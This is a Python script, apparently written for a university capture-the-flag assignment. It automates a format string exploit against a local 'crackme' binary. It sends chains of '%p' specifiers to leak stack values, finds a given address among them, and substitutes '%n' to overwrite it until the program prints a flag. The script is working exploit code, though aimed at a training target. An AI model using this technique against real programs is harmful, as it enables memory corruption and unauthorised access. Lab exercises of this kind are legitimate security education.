#!python3
import subprocess

pointer = "%p"
writestack = "%n"
fileName = ""
address = ""

def readFileName():
    return input("Please provide the file name: \n")

def readKnownAdress():
    address = input("Provide the known hexadezimal of the vulnerable variable or number: \n")

    # check if there was an user input
    # check for number or address in input
    while(True):
        if(address):
            if(address.isnumeric()):
                break
            if(checkHex(address)):
                break

        address = input("Please provide a valid address or number: \n")

    # if input is valid but not hex convert to hex
    if not address.startswith("0x"):
        address = hex(int(address))
    return address

# check if input is hex
def checkHex(input):
    try:
        int(input, 16)
        return True
    except:
        return False

def searchForFormatStringVulnerbility():
    inputList = []

    # input %p
    # runProgram with %p
    # get result of %p
    # compare to address
    # if true add %n if not start again
    dowhile = True
    addedWritestack = False
    while dowhile:
        if not inputList:
            inputList.append(pointer)
        results = runProgram(' '.join(inputList))
        resultList = results[0].split()
        for line in results:
            if "FLAG" in line:
                print("The flag is: {}".format(line))
                print("password is: \n")
                print(' '.join(inputList))
                print("or in short: \n")
                print("%{}$n".format(len(inputList)))
                
                dowhile = False
                return
        # %n was added to the wrong stack therefore delete it from inputList and replace it with %p
        if addedWritestack:
            inputList.pop()
            inputList.append(pointer)
            addedWritestack = False

        for line in resultList:
            # check if line contains our address
            if line == address:
                # add %n to the inputList
                inputList.append(writestack)
                addedWritestack = True
                break

        if addedWritestack is False:
            inputList.append(pointer)


def runProgram(input: str):
    # programm ausführen
    # print("="*8, "START SUBPROCESS", "="*8, "\n", "$ /home/kali/Documents/team-04/Assignment_31/crackme")
    p = subprocess.Popen(['./{}'.format(fileName)], bufsize=0, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT, shell=False)
    #p = subprocess.Popen(['/home/kali/Documents/team-04/Assignment_31/crackme'], bufsize=0, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT, shell=False)    
    # passwort eingeben und bestätigen
    write = p.stdin.write(bytes(input, "utf-8"))
    write = p.stdin.write(b'\n')
    # ergebnis lesen und speichern
    results = []
    for line in p.stdout.readlines():
        # print(line.decode("utf-8"))
        results.append(line.decode("utf-8"))
    # prozess beenden
    if not p.poll():
        p.kill()
    return results


fileName = readFileName()
address = readKnownAdress()
searchForFormatStringVulnerbility()